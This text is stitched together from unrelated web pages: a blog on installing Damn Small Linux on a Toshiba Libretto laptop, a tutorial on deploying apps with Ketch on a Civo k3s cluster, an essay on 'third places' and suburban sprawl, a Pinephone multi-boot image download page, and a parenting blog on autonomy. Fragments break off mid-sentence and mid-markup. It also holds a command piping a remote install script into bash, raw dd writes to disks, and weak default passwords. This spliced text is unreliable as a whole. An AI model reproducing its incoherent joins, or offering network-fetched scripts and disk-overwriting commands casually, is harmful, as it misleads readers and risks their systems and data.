anything like that, which is understandable, given the size of the
case.</p>

<p>It does have an Infrared device, which is quite slow and useless,
but for its time it was as good as wireless could get. The other
holes correspond to the power adapter and the reset button next to
the PCMCIA, big enough to be able to reset the laptop with a
regular pen.</p>

<p>For the full specifications, please refer to
<a href="https://download.milesburton.com/Libretto/Datasheets/libretto_50_e.pdf">the official leaflet</a>.</p>

<p><a href="https://cfenollosa.com/blog/img/libretto.jpg"><img src="https://cfenollosa.com/blog/img/libretto.thumb.jpg" alt="The Libretto" title=""></a></p>

<p>The setup I will be using: the Libretto, and a 3Com 16-bit PCMCIA
Ethernet card</p>

<h4>Choosing a Linux distribution</h4>

<p>I wanted to find some modern, low-demanding software, not
unsupported versions of Debian or RedHat. As you might have
expected by this page's title, I chose
<a href="http://www.damnsmalllinux.org/">Damn Small Linux</a> (DSL).</p>

<p>I was very lucky to find that my machine had been upgraded to 24 MB
of RAM. Apparently, even low-end distros have difficulties booting
a regular kernel with 16 MB. I didn't want to tune or recompile the
kernel on a 75-MHz machine, so I had to do some tricks.</p>

<p>In order to decide on a distro, I tried to set some goals up:</p>

<ol>
<li>Discard modern distributions which require at least 256 MB of
RAM. In fact, discard anything that doesn't work with 24 MB of RAM</li>
<li>Try to avoid old versions of current distros (i.e. Debian
Woody) because the ISOs and the packages might not be mirrored
anymore and are difficult to be found.</li>
<li>Use a distro which self-configures kernel modules on boot,
because I will be installing from a Virtual Machine and the
hardware will change between reboots. Recompiling the kernel is
totally out of the picture.</li>
<li>Kernel 2.4 if possible, to make both the audio and the Ethernet
work</li>
<li>As easy to configure as possible. I want to finish this in a
few hours... [Narrator: he didn't]</li>
</ol>

<p>I found myself with these contenders,
<a href="http://www.damnsmalllinux.org/">Damn Small Linux</a>,
<a href="http://puppylinux.org/">Puppy Linux</a> and
<a href="http://distro.ibiblio.org/tinycorelinux/welcome.html">Tiny Core Linux</a>.</p>

<p>DSL v4 was the chosen one for many reasons. First, the default
software choice is a good compromise and finely tuned for
low performing machines. The installation seemed the easiest
of the three, and—very important—worked flawlessly inside
VirtualBox. The documentation is very extensive and, as a slightly
old distro, there are lots of manuals and forum posts with
solutions to common problems.</p>

<p>There is also the fact that DSL is based on Knoppix, so it detected
my hardware perfectly, didn't have to tweak the PCMCIA, and only
had to configure the audio manually because the I/O ports were not
the standard ones. This was a huge aid for me. PCMCIA Internet
working out of the box is something I hadn't even imagined to
have.</p>

<p>However, the decision also came with a few drawbacks. DSL has its
own "package manager", which only works from X and can't uninstall
packages. </p>

<p><code>apt-get</code> can be enabled, but it might break packages already installed with MyDSL.
Furthermore, those packages tend to disappear on a reboot for some reason. I'm
still unsure on whether to use apt-get with MyDSL. We will not be using it.</p>

<p>The ACPI doesn't work, but I don't know whether it's the kernel or the Libretto's
fault.</p>

<p>My biggest fear, however, is that most of the packages are old and
might have security issues. However, as this will not be my main
machine, and it won't run a browser with JavaScript enabled, I'm
not very worried.</p>

<p><strong>Why didn't I choose Tiny Core?</strong> because it didn't boot on a
VirtualBox machine with 24 MB of RAM. It would have been my first
choice, because it is better maintained than DSL. A real pity.</p>

<p><strong>And what about Puppy?</strong> The LiveCD is great but the installation
instructions were too complicated for me. I really didn't want to
spend that much time configuring everything. It is maybe too modern
(based on Slackware 13.37 with Kernel 3.1.10) and I doubt the
Libretto could have handled its kernel.</p>

<h4>Installation</h4>

<p><em>Please note: I will assume that you have some experience with Linux, partitioning, and installing stuff from a console.</em></p>

<p><strong>Strategy</strong></p>

<p>There are two alternatives: use floppy disks or physically remove
the drive and set up a VM. Years ago, I went the first path,
because I had the floppy disk drive. Since I don't have it
anymore, I found
<a href="http://davissharonforest.tripod.com/DebianLinux31onToshibaLibretto50.htm">an awesome tutorial</a>
which suggested to physically remove the drive from the Libretto,
attach it to a 2.5" IDE to USB adaptor, and install the system from
another computer. Check out his pictures for details on how to
remove the drive. My machine is in a bad condition
(broken hinges, cracks all over the case, stuck screws) and I had
to break some plastics and metal parts to access the drive.</p>

<p>So, we will use another Linux computer, which you probably already
have, and set up a virtual machine inside VirtualBox. Then, we will
remove the Libretto's physical HDD and attach it via USB to your
computer, using an adapter. The DSL CD image and the new /dev/sd
will be mapped inside the VM.</p>

<p>This way we can boot and install from a CD, instead of doing
netinsts with the Debian Woody diskettes, as you will read on many
other websites. It is the fastest and painless way, and if you
don't have the floppy drive, it is the only way.</p>

<p>If you have the floppy drive and are wondering if it is worth to
buy the adapter, go ahead! Walk the
difficult path, install DOS, start a Linux setup from DOS, try to
make the floppy disk work, then install from diskettes with a
crappy kernel, fight with the PCMCIA driver until you are able to
use the network, and install from the net. And, should the
installation fail, start OVER AGAIN! When this happens, please send
me an email so that I can pretend that I sympathize with you but
actually laugh at your misery.</p>

<p>Talking seriously, I am just trying to warn you.
I tried that, I failed, then I succeeded, and not even in my
success I want even the worst of my enemies going that path. Buy it, 
then come back and follow these instructions.</p>

<p><strong>Removing the hard drive</strong></p>

<p>You already have the adapter? Great! I bought
this one which worked great and allowed me to manipulate the drive from my
main computer.</p>

<p><a href="https://cfenollosa.com/blog/img/ide_adapter_box.jpg"><img src="https://cfenollosa.com/blog/img/ide_adapter_box.thumb.jpg" alt="The 2.5inch IDE to USB adapter" title=""></a></p>

<p>This is the adapter in its box. It comes with an enclosure that I
didn't use to avoid overheating, and a handy screwdriver.</p>

<p><a href="https://cfenollosa.com/blog/img/ide_adapter.jpg"><img src="https://cfenollosa.com/blog/img/ide_adapter.thumb.jpg" alt="The 2.5inch IDE to USB adapter, close up" title=""></a></p>

<p>A close up of the IDE adapter. Don't buy a SATA one by mistake!</p>

<p><strong>Using the drive in VirtualBox</strong></p>

<p>As stated before, we will use VirtualBox to make DSL think it is
running on a real machine, and that the—now USB— hard drive is the
main drive of the VM. Turns out that using a physical disk from <code>/dev</code> on
VirtualBox isn't easy to find, but the actual command is simmple.</p>

<p><strong>Please make sure that your Linux has detected the USB drive as <code>/dev/sdb</code> before proceeding or you might lose data on the wrong disk!</strong>
If in case, use Disk Utility or check dmesg.</p>

<pre>VBoxManage internalcommands createrawvmdk -filename disk.vmdk -rawdisk /dev/sdb
                                                                       ^^^^^^^^  &lt;-- check this
</pre>

<p>The command above will create a file named disk.vmdk, which is a
short plaintext file which references to <code>/dev/sdb</code>. You can now add
it to your VM using the normal VirtualBox Appliance Manager</p>

<p><strong>Partitioning</strong></p>

<p>Use your main Linux box to partition the hard drive. Disk Utility
works well, but I used cfdisk.</p>

<p>The tutorial then notes that the last 32MB of the disk space are
used for the Libretto's hardware Hibernate feature. I followed his
partition table suggestions completely. Just in case his page is
down, do this:</p>

<ul>
<li><code>/dev/hda1</code> 738.0 MB, <code>ext2</code> (ext3 is slower, but more secure),
mounted as <code>/</code></li>
<li><code>/dev/hda2</code> 40.3 MB, <code>swap</code></li>
<li>A remaining free space of 37.2 MB. Don't worry if the figure is
slightly higher or lower due to rounding.</li>
</ul>

  Introduction
</h2>


<p>Ketch is a very new open source <a href="https://theketch.io/">project by Shipa</a> that shares a similar concept with the Shipa DNA.</p>

<p>Ketch is heavily focused on easing out application deployments for developers, aiming for a situation where a developer does not have to write any YAML configuration files, and can directly deploy their application on any Kubernetes cluster.</p>

<p>In this post we will go through Ketch Concepts and then deploy an application to a <a href="https://www.civo.com/kube100/">managed k3s cluster on Civo</a>.</p>

<p>The official definition of Ketch from Shipa is "an application delivery framework that facilitates the deployment and management of applications on Kubernetes using a simple command line interface. No YAML required!"</p>

<p>This simply means that you can deploy applications onto any Kubernetes cluster by just using the Ketch CLI. But there is much more!</p>

<p>Kubernetes has become the de facto standard for deploying microservices and containerized applications, but there is a learning curve for a developer to get familiar with Kubernetes concepts, Kubernetes objects, how to write the required YAML files, and then how to create and manage them. These issues are there for any organization, big or small, as Kubernetes itself is complex and requires a lot of  knowledge to get up and running. Ketch works toward solving these issues by eliminating the need for writing YAML files and directly deploying applications onto a cluster.</p>

  Architecture
</h2>


<center><img src="https://civo-com-assets.ams3.digitaloceanspaces.com/content_images/1061.blog.png?1606373643" alt="Ketch architecture"></center>

<p>The above image is from the <a href="https://learn.theketch.io/docs/architecture">Ketch documentation</a>, and displays the architecture overview. Inside our cluster, we have a Ketch Controller, custom resource definitions (CRD) for the Pool and App, and an Ingress controller.</p>

<p><strong>Pool CRD</strong> - It's basically used to isolate different applications deployed. Each pool created will configure a namespace and other components onto the cluster.</p>

<p><strong>App CRD</strong> - Provides App context to applications and is responsible for running the application and managing its lifecycle.</p>

<p><strong>Ketch Controller</strong> - Monitors the changes that happen in the Pool and App CRDs. Ketch can also create a complete Helm chart for the application which can be used in different ways.</p>

<p><strong>Ingress Controllers</strong> - As of the writing of this guide, Ketch supports Traefik and Istio.</p>

<h2 id="prerequisites">
  <a href="#prerequisites"><i></i></a>
  Prerequisites
</h2>


<ul>
<li>A Kubernetes cluster you control. We'll take advantage of <a href="https://www.civo.com/kube100">Civo's super-fast managed k3s service</a> to experiment with this quickly. If you don't yet have an account, sign up to the beta now to take advantage of quick deploy times and $70 free credit per month! Alternatively, you could also use any other Kubernetes cluster.</li>
<li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">kubectl installed</a>, and the <code>kubeconfig</code> file for your cluster downloaded.</li>
</ul>

<center><img src="https://civo-com-assets.ams3.digitaloceanspaces.com/content_images/1020.blog.png?1604672061" alt="Civo Kubernetes configuration"></center>

<p>Make sure you can connect to your Kubernetes cluster by running</p>

<pre><code>kubectl get nodes
</code></pre>

<p>You should see the names of the nodes in your cluster displayed.</p>

</h2>


<h3 id="installing-ketch">

  Installing Ketch
</h3>


<p>First the Ketch Binary has to be downloaded in order to deploy the application to our Kubernetes cluster. In this case I am installing Ketch CLI on my Mac:</p>

<pre><code>$ curl -s https://raw.githubusercontent.com/shipa-corp/ketch/main/install.sh | bash

Downloading Ketch binary from https://github.com/shipa-corp/ketch/releases/download/v0.1.0/ketch-darwin-amd64 to /usr/local/bin/ketch
Ketch client installation was successful

$ ketch -v
ketch version 0.1.0
</code></pre>

<h3 id="ingress-controller">
  <a href="#ingress-controller"><i></i></a>
  Ingress controller
</h3>


<p>As of the writing of this guide, Ketch supports two ingress controllers, Traefik and Istio, with a plan to add more in the future. By default k3s comes with Traefik Ingress controller, which you can check using the following commands that show the pods that should include your Traefik pods, as well as the running service to manage traffic:</p>

<pre><code>$ kubectl get pods -A
NAMESPACE     NAME                                     READY   STATUS      RESTARTS   AGE
kube-system   metrics-server-7566d596c8-ks9ss          1/1     Running     0          5m45s
kube-system   local-path-provisioner-6d59f47c7-d74ng   1/1     Running     0          5m45s
kube-system   helm-install-traefik-fwr9s               0/1     Completed   0          5m45s
kube-system   svclb-traefik-886fk                      2/2     Running     0          5m27s
kube-system   coredns-8655855d6-zzr8z                  1/1     Running     0          5m45s
kube-system   traefik-758cd5fc85-2jf57                 1/1     Running     0          5m27s
kube-system   svclb-traefik-lz8bl                      2/2     Running     0          4m59s
kube-system   svclb-traefik-xz2r7                      2/2     Running     0          4m51s

$ kubectl get svc -A | grep traefik
kube-system   traefik-prometheus   ClusterIP      192.168.219.19    &lt;none&gt;            9100/TCP                     6m18s
kube-system   traefik              LoadBalancer   192.168.145.176   185.136.234.146  80:32596/TCP,443:30706/TCP   6m18s

</code></pre>

<p>You can see that Traefik comes pre-installed when you spin up a k3s cluster on Civo, and serves up an external IP address.</p>

<p><strong>Note</strong> - If you are using a different Kubernetes cluster make sure you install Traefik or Istio from <a href="https://github.com/shipa-corp/ketch#install-ingress-controller">here</a>.</p>

<h3 id="cert-manager-install">
  <a href="#cert-manager-install"><i></i></a>
  Cert-Manager Install
</h3>


<p>Ketch Requires a certificate manager to be installed onto the cluster. This can be installed via the Civo Marketplace, either on the web on your cluster management page, or with <a href="https://www.github.com/civo/cli/">Civo CLI</a>.</p>

<center><img src="https://civo-com-assets.ams3.digitaloceanspaces.com/content_images/1058.blog.png?1606370955" alt="App marketplace"></center>

<pre><code># Installing cert-manager via civo cli, to our cluster called "ketch"
civo kubernetes applications add cert-manager --cluster=ketch
</code></pre>

<p>If you are using a different or self-hosted Kubernetes cluster, you can install cert-manager by using the below command:</p>

<pre><code>kubectl apply --validate=false -f https://github.com/jetstack/cert-manager/releases/download/v1.0.3/cert-manager.yaml
</code></pre>

<p>Whichever option you choose, check that cert-manager is running:</p>

<pre><code>kubectl get pods -n cert-manager
NAME                                       READY   STATUS    RESTARTS   AGE
cert-manager-cainjector-6d5dfbc779-jsrpj   1/1     Running   0          103s
cert-manager-68d4985c5d-v6fw9              1/1     Running   0          103s
cert-manager-webhook-59fccfc69b-xjwjt      1/1     Running   0          103s
</code></pre>

<h3 id="install-ketch-controller">
  <a href="#install-ketch-controller"><i></i></a>
  Install Ketch Controller
</h3>


<p>As we have seen in the Architecture section, our cluster will need a Ketch Controller that will be creating and watching the Pool CRD and App CRD.</p>

<pre><code>$ kubectl apply -f https://github.com/shipa-corp/ketch/releases/download/v0.1.0/ketch-controller.yaml

  Creating a Ketch Pool
</h3>


<p>Before deploying an app you need to create a Ketch pool. This is where we will need the external IP address of our ingress. We will get it by checking our Traefik service:</p>

<pre><code>$ kubectl get svc -A | grep traefik
kube-system    traefik-prometheus                         ClusterIP      192.168.219.19    &lt;none&gt;            9100/TCP                     93m
kube-system    traefik                                    LoadBalancer   192.168.145.176   185.136.234.146   80:32596/TCP,443:30706/TCP   93m
</code></pre>

<p>Then, we run <code>ketch pool</code> to add our pool:</p>

<pre><code>$ ketch pool add saiyam  --ingress-service-endpoint 185.136.234.146 --ingress-type traefik
Successfully added!
</code></pre>

<p><strong>Running the above created a new namespace</strong></p>

<pre><code>$ ketch pool list
NAME      STATUS     NAMESPACE       INGRESS TYPE    INGRESS CLASS NAME    CLUSTER ISSUER    APPS
saiyam    Created    ketch-saiyam    traefik                                                 0

$ kubectl get ns | grep saiyam
NAME              STATUS   AGE
ketch-saiyam      Active   20s
</code></pre>

<p>As of now there are 0 apps in the pool, so let's create an application</p>

<pre><code>$ ketch app create hello --pool saiyam

$ ketch app list
NAME     POOL      UNITS    ADDRESSES                                   DESCRIPTION
hello    saiyam    0        http://hello.185.136.234.146.shipa.cloud

$ ketch pool list
NAME      STATUS     NAMESPACE       INGRESS TYPE    INGRESS CLASS NAME    CLUSTER ISSUER    APPS
saiyam    Created    ketch-saiyam    traefik                                                 1
</code></pre>

<p>You can see that the App has 0 units as we have not deployed any app but just by creating the app, it created the endpoint automatically.</p>

<p>Now let's actually deploy an image onto the k3s cluster.</p>

<pre><code>$ ketch app deploy demo -i docker.io/saiyam911/ketch-demo
Successfully deployed!

$ ketch app list
NAME    POOL      UNITS    ADDRESSES                                  DESCRIPTION
demo    saiyam    1        http://demo.185.136.234.146.shipa.cloud
</code></pre>

<p>The application has been deployed successfully from the image provided. If we visit the address provided by the <code>ketch app list</code> command above, we should see the following:</p>

<p>Behind the scenes, Ketch has created a deployment and other Kubernetes objects to expose the application. Additionally, Ketch can export your application as a helm chart which can be used to distribute your application. This is a really cool feature in my opinion, which will be discussed in more detail below.</p>

<p>There's a classic old idiom, "don't put your eggs all in one basket". The reasoning goes, what if the basket breaks? What if the basket isn't big enough, or gets stolen, or was cursed by a witch or something? It's important to have redundancy, to spread the eggs across many basket so that there's no one single point of failure.</p>
<p>But if we look at society, if we look at the internet, if we look at the communities we've built ourselves around... unfortunately, I believe that's exactly what a lot of us are doing. Being able to be yourself, being able to choose how you present yourself to the world, being able to tailor your living environment to your needs and desires? That's all very, very important. But if you give the keys to your self-expression and the options for the communities you belong in to one small, largely unknown group of people, that's not good.</p>
<p>In this ludicrously in-depth article, we'll be discussing how society limits both individual and community self-expression both online and offline.</p>
<h2>Part 1: The Third Place</h2>
<p><img alt="A house, labeled '1', an office complex, labeled '2', and a '3' with a question mark" src="https://invisibleup.com/articles/31/thirdplace.png"></p>
<p>Very, very broadly speaking, a working-class person (that is, not an "owner" like a CEO, landlord, or investment banker) lives their life in three kinds of places. The first place is home. It's where you sleep, it's where you do your hobbies, it's where you have privacy and family and possibly friends if you want to invite them over. The second place is work, where you do a job to contribute to society and receive wages.</p>
<p>But clearly, we do more than that. We go to other places. Grocery stores and shops, of course, but besides that. The "third place" is where you spend your time in public, in your community. American urban sociologist Ray Oldenburg, who came up with the concept of "the third place" in his 1989 book "The Great Good Place", defines the third place as (commonly seen as) eight characteristics.</p>
<ol>
<li>There is no obligation to be here for legal, survival, political, etc. reasons. You can just <em>not show up</em>.</li>
<li>Everyone is equal. The rich, the poor, the minorities and the majorities all intermingle together in one common space.</li>
<li>Conversation and socializing is the main activity. You go here to "hang out".</li>
<li>They're accessible and accommodating for anyone who wants to visit.</li>
<li>It's a place where people regularly go, and whose regulars give the space its vibe and characteristics.</li>
<li>The physical place is not overly pretentious or imposed. It feels like <em>the community</em>, like an extension of home.</li>
<li>Generally speaking, the vibe here is more calm and friendly and playful than actively hostile and argumentative.</li>
<li>You feel like you have genuine ownership in the place, as if it's almost a communal home for you and the people you care about.</li>
</ol>
<p>That's a relatively high bar, when spelled out like that. In pandemic-era America you'd be very hard pressed to name a place like this. Offline, anyways. But this sort of pattern has shown up a lot in history, because as it turns out people <em>like</em> having a communal space to just vibe in.</p>
<h3>The Town Square</h3>
<p><img alt="The Zócalo in Mexico City" src="https://invisibleup.com/articles/31/zocalo.jpg"></p>
<p>The most obvious example in urban environments is the town square or the plaza. It's an open area in the middle of town, usually with benches and close access to shops and homes and such. Pictured is <em>La Plaza del Zócalo</em>, the main square of Mexico City. It's been a meeting spot for the people of the area since the Aztec times, an important location for numerous historical events, and significant enough to warrant its own Wikipedia page. That's really amazing for a 240 m^2 slab of concrete. What's even more amazing is that it <em>wasn't</em> always a slab of concrete. Here's a model of how it looked in 1910.</p>
<p><img alt="The Zócalo in Mexico City" src="https://invisibleup.com/articles/31/zocalo1910.jpg"></p>
<p>It was a big park area! With a bunch of trees and benches and everything. Unfortunately, the very shaky politics of 20th century Mexico left the area in major disrepair by the 1970s, and it became that. I am not from Mexico, nor do I know anyone from the region, so I can't comment on what that did to the community in Mexico City. But as an outsider, I'd consider the 1910 Zócalo much more friendly and inviting than the modern one, which is literally a flat surface with a flagpole in the middle all surrounded by a busy road.</p>
<p>Obviously that isn't the only example. These tend to be a staple of small European and Hispanic towns. Just, a place, in your neighborhood, to go and chill. Other famous examples include the Roman Forum, the Greek Agoras, the National Mall of Washington D.C, and the "quads" or "diags" of most college campuses.</p>
<h3>Shopping Malls</h3>
<p>It is incredibly worth pointing out that town squares only make sense in urban contexts, where there's a dense population of people who live, work, and shop in one general area. The appeal of town squares is that they're basically on the way to wherever you're going, so it's a really nice spot to meet up with friends or just go if you're bored.</p>
<p>Suburbia is <em>not</em> that. Or, more accurately, it is that, <em>at the scale of the car.</em> See, America's fascination of suburban sprawl has a long detailed history to it. Paraphrasing from (imo) a very good book, "Repairing the American Metropolis: Common Place Revisited" by Douglas S. Kelbaugh, the blame of sprawl can be pinned down largely on cultural reasons. First off, Americans always solved their resource and land division issues by expansion, growth, "moving out west". It was the safety valve to avoid actually thinking about difficult problems. At the time this was seen as the country's "manifest destiny", which eventually led to <a href="https://www.youtube.com/watch?v=FfoQBTPY7gk">unnervingly cheery songs on children's television happily glossing over the genocide of Native Americans like it was no big deal</a>. And, heck, if we got all this elbow room, why not make everything really, really big? Big houses, big rooms, big parcels of land. And really, really cheap too, because of the glutton of natural resources. And sure, that'll get old and worn sometime, but some of the population will leave for greener pastures anyways, so there's no need to change anything.</p>
<p>So, around the early-to-mid 20th century, when cities were getting too full of colored people who were just demanding rights too loudly, most of the rich white people just up and left. They settled suburban areas outside the cities, less densely populated, with all the backyard space you need to cook out with your neighbors. And via <a href="https://en.wikipedia.org/wiki/Redlining">redlining</a>, it was possible to dig very deeply a concrete "us vs. them" line in the dirt. The newfangled highway system just made it easier to separate the houses from the factories, to drive a wedge in the population. Also, just to drive the point home, federal, state, and local governments have subsidized services like sewer pipe connections, energy, and road building, often funded by taxes generated from the more urban, more productive areas.</p>
<p>An incredibly good example of this is to compare Flint and Burton, MI to the surrounding cities of Grand Blanc, Flushing, and Davison. I could spend a lot of time on this but I'd rather just do a visual comparison.</p>
<p><img alt="Fox Hill Glens of Grand Blanc, MI" src="https://invisibleup.com/articles/31/grandblanc.jpg">
<img alt="Section of the Flint River of Flint, MI" src="https://invisibleup.com/articles/31/flintriver.jpg"></p>
<p>It should be laughably easy to tell which one is which. (The first pic is the Fox Hill Glens of Grand Blanc, which was the first image Google gave me. The second pic is a section of the Flint River between downtown Flint and Kettering University. I took that pic during an urbex tour a few years back, because Flint was somewhat nearby and makes for <em>amazing</em> urbex pics.)</p>
<p>Where this starts to cause issues is that instead of having one core neighborhood with residential, commercial, <em>and</em> industrial areas (in a SimCity-esque model), we've split those sections into their own, largely independent areas, often harshly split on racial or class boundaries. We've got gigantic swaths of houses with maybe a corner store and a gas station, we've got giant industrial parks or office complexes, and we've got the commercial districts.</p>
<p>It's the commercial districts I really want to highlight here. If the residential areas are home, and the industrial/office parks are work, then clearly the third place is the commercial district. Now, there's two ways to approach that. </p>
<p><img alt="A strip mall" src="https://invisibleup.com/articles/31/stripmall.jpg"></p>
<p>The most common approach is to just put a bunch of boxes next to each other, surround it with a parking lot, and call it "a strip mall". Occasionally there will also be a "big box" store, like a Wal-Mart or a Target or a Best Buy or a Kohl's or a Home Depot, either attached or detached.</p>
<p>In the very worst scenarios, you're subject to drive through the <a href="https://www.strongtowns.org/journal/2017/10/30/the-stroad">"stroad", or street-road</a>, where all the shops each have their own driveway and their own parking space and it's hostile to both people <em>and</em> cars.</p>
<p>You drive here (or take the bus, if you're poor and you're fine with the once-an-hour service), you shop, you drive home. You don't really spend time here. There is literally nothing here besides concrete boxes. And also the constant issue of cars driving past you. Hope you like sprinting across five lanes of traffic moving at 40 mph!</p>
<p>Enter Austrian-born architect <a href="https://en.wikipedia.org/wiki/Victor_Gruen">Victor Gruen</a>. After fleeing to America from the Nazis, on account of being a Jewish socialist, he slowly worked up the career ladder, from draftsman to architect. And he absolutely saw the issues of suburban sprawl. In the 1950s he gave a speech where he called the suburbs "avenues of horror ... flanked by the greatest collection of vulgarity ... ever collected by mankind."</p>
<p><img alt="The Strand Arcade in Sydney CBD, Australia, opened 1892" src="https://invisibleup.com/articles/31/arcade.jpg"></p>
<p>As an alternative, he envisioned a single building, a few shops surrounded by a shared courtyard, protected from the weather. Something of an iteration of the old "arcades", like the Strand Arcade in Sydney, Australia as pictured above. The courtyard was the most substantial improvement, it was somewhere to go <em>in between</em> shopping. The arcade was just a straight hallway normally, literally just shops in a building. The shopping mall was a <em>destination</em>.</p>
<p>Victor has larger goals in mind. He expected this to be just <em>one</em> part of a new, dense, suburban community. He imagined indoor malls with housing, with schools and libraries and doctor's offices and offices, perhaps surrounded outside by high density housing or other needs. …</p></article></div>

<p>Here you can find a multi-boot uSD card image containing 17 different Pinephone distributions. 
The purpose of this image is for users to <b>easily try current major (and some minor) Pinephone Linux distributions</b>,
without having to figure out how to flash them individually and juggle with many uSD cards.

</p><p>Key points:

</p><ul>
	<li>[Relatively] small 6GiB image containing 17 distributions:
	<ul>
		<li>Arch Linux ARM 2020-11-21
		</li><li>Arch Linux ARM / dreemurrs 20201112
		</li><li>Lune OS 2020-11-23
		</li><li>Maemo Leste 20201101
		</li><li>Manjaro / Phosh beta2-20201119
		</li><li>Manjaro / Plasma 201122
		</li><li>Mobian 20201121
		</li><li>KDE Neon 20201123-084050
		</li><li>pmOS / Plasma Desktop 2020-11-21
		</li><li>pmOS / fbkeyboard 2020-11-21
		</li><li>pmOS / GNOME 2020-11-21
		</li><li>pmOS / Plasma Mobile 2020-11-21
		</li><li>pmOS / Phosh 2020-11-21
		</li><li>Sailfish 1.1-3.3.0.16-devel-20201101
		</li><li>pmOS / sxmo nightly-202011090018
		</li><li>Ubuntu Touch 2020-11-19
		</li><li>Jumpdrive 0.6
	</li></ul>

	</li><li>Runs my <a href="https://xnux.eu/p-boot">p-boot</a> bootloader and <a href="http://xff.cz/git/linux">my latest kernel</a> (5.10-rc5)
	</li><li>Based on btrfs subvolumes and file level deduplication (if you mess up, you can easily revert each distribution to original state using pre-created btrfs snapshots)
	</li><li>All included distributions work on Braveheart and later Pinephone variants (incl. 3GiB variant), thanks to sharing my kernel and bootloader
	</li><li>My modem power management driver is used on all distributions for safe and reliable handling of modem power (instead of ad-hoc scripts used by original distributions)
	</li><li>Suspend to ram based on the latest crust is available to all distributions (whether they actually use it or not)
	</li><li>The image is made to fit a 16GiB or larger uSD cards, and also works when flashed to eMMC
</li></ul>

<p>Some development history and technical details can be found on <a href="https://xnux.eu/log/">my blog</a>.

</p><p>There are some excellent presentations of the multi-boot image available on youtube:</p>
<ul>
	<li><a href="https://www.youtube.com/watch?v=of2I3cRY3VI">PinePhone multi-distro demo image (2)</a> by Avisando
	</li><li><a href="https://www.youtube.com/watch?v=7GjXQFnMHGY">Megi's multi-boot image for the PinePhone (with 17 Linux distros)</a> by Liliputing
</li></ul>

<h2>News</h2>

<h3>2020-11-23</h3>

<ul>
<li>Added more distros (Manjaro, Arch dreemurrs, Jumpdrive, pmOS / plasma desktop). Removed PureOS (doesn't seem to be maintained anymore).
</li><li>All distros updated to the latest versions.
</li><li>p-boot has more features, auto-repeat for volume keys, scrolling menu, reboot to eMMC OS, air-gapped boot mode, battery indicator.
</li><li>Newer kernel (5.10-rc5) with 60fps fix.
</li></ul>

<h2>Quirks</h2>

<p>Most distributions don't need any patching to work with my latest 5.10 kernel and to be well behaved denizens of the multi-boot image. Nevertheless, some files still needed to be overrided. You can see those in the project's GIT repository, bellow.

</p><h2>Download</h2>

<p>The image is distributed as a <a href="http://dl.xnux.eu/p-boot-multi-2020-11-23.torrent">torrent</a> due to its size.
Install some torrent software (suggestions: <a href="https://transmissionbt.com/">transmission</a>, <a href="https://www.qbittorrent.org/">qBittorrent</a>) and click the previous link to start the download.
Don't forget to let the torrent client run even after the download finishes so that other people can get the image too.
I only seed to the ratio of 10x at unlimited speed (1Gbit).

</p><p>The image is also available at: <a href="http://dl.xnux.eu/p-boot-multi-2020-11-23/">http://dl.xnux.eu/p-boot-multi-2020-11-23/</a> as a regular download.
 Download via HTTP is rate limited to 128 KiB/s. So if you want to get the image faster, use a torrent.

</p><p>There's also a mirror of the image by the discord user <b>uxes</b> at <a href="http://mirror.uxes.cz/dl.xnux.eu/">http://mirror.uxes.cz/dl.xnux.eu/</a>.

</p><h2>Installation</h2>

<p>Installation consists of decompressing image data (gzipped) and to the SD card's whole block device. For example you can use <code>zcat multi.img.gz | sudo dd of=/dev/sdcarddevice bs=1M</code> (if you know how to identify your SD card's block device).

</p><p>Verify the image was written correctly immediately after flashing by running <code>dd if=/dev/sdcarddevice bs=1M count=10000 | sha256sum</code>.
SHA256 sum must be <code>25597ef407b4162a99ac53b144ca19227c4d15a653a4db8205eed2759c0c757d</code>.
 If your OS auto-mounts new filesystems, make sure it does not do it for the SD card image, otherwise the hash may change, and this verification method will be unreliable.

</p><p>Optionally (strongly encouraged step) you can also stretch the OS partition to fit your entire uSD card, otherwise the free space inside the filesystem will be limited to about 1.5 GiB, which is not enough for OS updates and/or longer term use of this image. If you run out of space, all included distributions may become unstable.

</p><p>Partition stretching instructions are on <a href="https://xnux.eu/log/#toc-resizing-the-partition-after-flashing-the-image">this page</a>.

</p><h2>Passwords</h2>

<p>All passwords were changed to 1111 where possible. Manjaro password is 123456. Root passwords are 1111. sxmo login/password is mo/1111.

</p><h2>Support the project</h2>

<p>p-boot demo image generator is free and opensource software released under GPLv3.
It is an independent personal project not backed by any comapny or commercial interests.
You can contribute by writing code, helping improve documentation, spreading the word, and/or <a href="https://xnux.eu/contribute.html">by donating</a>.

		<p>I’m grateful to learn from my daughter. Be able to see how the brain develops and picks up new concepts, skills and words. Nowadays, I enjoy to sit down and watch her play. As a parent, I also need to help her to achieve her autonomy: emotionally, mentally and physically. It is the job, and my wife and I are navigating through it. There is not a guide on how to parent, and we discuss what is working and what is not working. Sometimes is just not the time for a new skill, other times our daughter doesn’t develop an interest for a particular activity. Well, we are all different, and that is what makes the world colourful!</p>

<p>Recently I was looking at one of the structures that we created to help our daughter to achieve her autonomy:</p>

<p><img src="https://www.joaorosa.io/images/assets/2020-11-25-organisational-structures-to-create-autonomy-what-i-ve-learned-from-my-daughter.jpg" alt="A tower, allowing my daughter to execute her tasks"></p>

<center>A learning tower, allowing my daughter to execute her tasks</center>

<p>Yes, you are seeing it right, we have what so-called a learning tower, allowing kids to achieve higher heights. They can climb and reach the countertops, with a high degree of safety. This one is on our bathroom, and she uses it to help her with her morning routine.</p>

<h3 id="what-the-heck-is-the-relationship-to-organisational-design">What the heck is the relationship to organisational design?!</h3>
<p>I can imagine that this is the question in your head. Well, I will continue to tell the story… We built the climbing towers after she started to walk without our help. My wife saw this concept in a parenting community, and we applied it. In the beginning, we asked our daughter if she wants to be in the climbing tower, and if she said yes, we would put her there. It was a “show and tell” type of style, given that it was a new concept to her. She used it for tasks such as brush her teeth, wash her hands, watch us cook, make a beverage. You can imagine the type of tasks.</p>

<p>What I observed across time, is that the brain embraced the concept, and when we nudge her for a task, let’s say, dinner, she would go to near the tower. It is a sign that she recognises the patterns, and knows the tools that can help her achieve the goal. Lately, she is proactive: we wake up in the morning, and she goes to the bathroom, climbs the tower and asks for her toothbrush. Most of the times, we don’t need to nudge her.</p>

<h3 id="applicability-to-organisations">Applicability to organisations</h3>
